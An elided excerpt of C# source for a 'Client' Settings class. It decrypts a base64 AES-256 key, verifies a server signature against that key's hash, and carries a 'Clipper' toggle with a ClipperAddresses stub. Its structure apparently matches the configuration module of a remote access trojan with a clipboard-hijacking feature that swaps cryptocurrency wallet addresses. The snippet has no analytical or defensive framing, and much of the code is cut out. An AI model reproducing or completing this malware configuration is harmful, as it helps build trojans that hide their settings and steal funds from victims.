...
namespace Client
{
    public static class Settings
    {
        ...
        public static Aes256 aes256 = new Aes256(ky);
        ...
        public static string Clipper = "false";
        public static string ClipperAddresses(string jj) { return ""; }
        ...
        public static bool InitializeSettings()
        {
            ...
            try
            {
                ky = Encoding.UTF8.GetString(Convert.FromBase64String(ky));
                aes256 = new Aes256(ky);
        ...
        private static bool VerifyHash()
        {
            try
            {
                ...
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ky)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
            }
            catch (Exception)
            {
                return false;
